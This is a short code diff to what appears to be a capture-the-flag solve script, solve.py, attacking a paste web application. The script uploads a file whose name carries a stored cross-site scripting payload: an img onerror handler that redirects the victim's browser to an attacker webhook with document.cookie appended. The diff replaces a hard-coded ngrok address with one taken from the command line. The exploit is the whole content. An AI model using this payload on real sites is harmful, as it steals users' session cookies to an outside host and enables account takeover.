@@ -7,7 +7,7 @@ import urllib.parse
 try:
     url = sys.argv[1]
 except:
-    print("Usage: uv run solve.py <URL> ",file=sys.stderr)
+    print("Usage: python solve.py <URL> <ATTACKER_WEBHOOK> ",file=sys.stderr)
     exit(1)
 
 s = requests.Session()
@@ -43,7 +43,8 @@ def paste(filename: str, content: str) -> typing.Tuple[requests.Response, str]:
     return (r, get_file_id(filename))
 
 _, id1 = paste('dummy.txt', 'hello')
-attacker = 'https://d8e5-176-29-229-249.ngrok-free.app/flag/'
+attacker = sys.argv[2] + '/flag'
+print(attacker)
 paste(f"filllle2.txt<img src=x onerror=\"window.location = '{attacker}' + document.cookie\"/>", 'hey')
 
 # adding +1 because I don't feel like fixing my get_file_id function :P
